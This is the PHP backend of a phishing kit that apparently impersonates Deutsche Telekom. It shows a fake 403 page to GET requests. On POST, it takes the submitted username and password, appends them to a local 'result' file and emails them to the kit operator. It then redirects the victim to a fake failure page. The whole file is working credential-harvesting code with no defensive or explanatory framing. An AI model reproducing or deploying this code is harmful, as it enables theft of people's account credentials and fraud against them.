<?php
session_start();
include_once 'mail.php';


if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

//Function to get the client ip address
// function get_client_ip_server() {
//     if(!empty($_SERVER['HTTP_CLIENT_IP'])){
// 		$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
// 	}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
// 		$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
// 	}else{
// 		$ipaddress = $_SERVER['REMOTE_ADDR'];
// 	}
// 	return $ipaddress;
// }

$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];





$user = $_SESSION['user'];
$pass = $_SESSION['pass'];



$message = "";
$message .= "===============|Telecom Deutsche|==============\n";
$message .= "ID  : ".$user."\n";
$message .= "Pass: ".$pass."\n";
$message .= "IP: ".$ip."\n";
$message .= "===============================================\n";
$send = "";
$subject = "Telekom";
$file = fopen("./man.html","a");   ///  Directory Of Rezult OK.
fwrite($file,$message);
$headers = "From: ".$ip."\n";
$headers .= "MIME-Version: 1.0\n";

mail($emailResult,$subject,$message,$headers);

header("Location: ./failed.php?true&sessionid=". generateRandomString(80));

?>
